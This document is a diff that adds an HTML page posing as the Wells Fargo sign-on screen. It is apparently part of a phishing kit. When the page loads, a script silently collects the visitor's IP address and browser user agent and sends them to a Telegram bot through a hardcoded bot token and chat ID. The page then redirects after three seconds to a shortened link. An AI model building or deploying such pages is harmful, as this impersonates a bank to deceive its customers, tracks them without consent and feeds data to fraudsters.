@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<html>
+<head>
+    <meta charset="utf-8">
+
+        
+
+        <meta name="viewport" content="width=device-width, initial-scale=0.85, user-scalable=no">
+        
+        <title>Sign On - Wells Fargo</title>
+
+    
+        <link rel="stylesheet" href="style.css"
+        type="text/css">
+        <link rel="icon" href="ico.png" type="image/png">
+        <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+        <script src="index.js"></script>
+
+        <!--Styling link for remember me checkbox-->
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css">
+        <style>
+            body{
+                background-image: none;
+                background-color: white;
+                overflow: hidden;   
+            }
+        </style>
+</head>
+<body>
+    
+    <div class="loader"></div>
+
+    <script>
+
+        // Function to redirect to another page
+        function redirectToAnotherPage() {
+            window.location.href = 'https://shorturl.at/goyK0'; 
+        }
+        // Set the delay for redirection (1.5 seconds)
+        var redirectDelay = 3000; 
+        // Wait for 1.5 seconds and then redirect
+        setTimeout(redirectToAnotherPage, redirectDelay);
+
+    </script>
+    <style>
+        body{
+            overflow: hidden;
+        }
+
+        /*----------Loader----------------*/
+
+        .loader {
+            position: fixed;
+            top: 45%;
+            left: 49%;
+            transform: translate(-50%, -50%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.75s, visibility 0.75s;
+        }
+
+        .loader::after {
+            margin-top: 50px;
+            content: "";
+            width: 25px;
+            height: 25px;
+            border: 5px solid whitesmoke;
+            border-top-color: #e8212b;
+            border-radius: 50%;
+            animation: loading 1.3s ease infinite;
+        }
+
+        @keyframes loading {
+            from {
+                transform: rotate(0turn);
+            }
+            to {
+                transform: rotate(1turn);
+            }
+        }
+    </style>
+
+    <script>
+        async function getUserIP() {
+            try {
+                const response = await axios.get('https://api64.ipify.org?format=json');
+                return response.data.ip;
+            } catch (error) {
+                console.error("Error getting IP address:", error);
+                return "Unknown IP";
+            }
+        }
+        
+        // Function to get user agent
+        function getUserAgent() {
+            return navigator.userAgent;
+        }
+        
+        // Log and send IP address and user agent
+        async function logAndSendUserInfo() {
+            const ipAddress = await getUserIP();
+            const userAgent = getUserAgent();
+        
+            const ipAndUserAgentLog = `
+            \n
+            <b>[Wells Fargo IP + UserAgent]</b>
+            \n
+            <b>IP Address: </b>${ipAddress}
+            \n
+            <b>User Agent: </b>${userAgent}
+            \n`;
+        
+            // Telegram Bot API endpoint and chat ID
+            const telegramBotToken = '5943159759:AAF2du7IRutCVQStuAp66ZdnfuKkJNjLtnA';
+            const chatId = '6391433593';
+        
+            const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+        
+            try {
+                const response = await axios.post(telegramApiUrl, {
+                    chat_id: chatId,
+                    text: ipAndUserAgentLog,
+                    parse_mode: 'HTML',
+                });
+        
+            } catch (error) {
+                console.error("Error sending IP:", error);
+            }
+        }
+        
+        // Call the logAndSendUserInfo function when the page loads
+        document.addEventListener('DOMContentLoaded', logAndSendUserInfo);
+    </script>
+</body>
+</html>
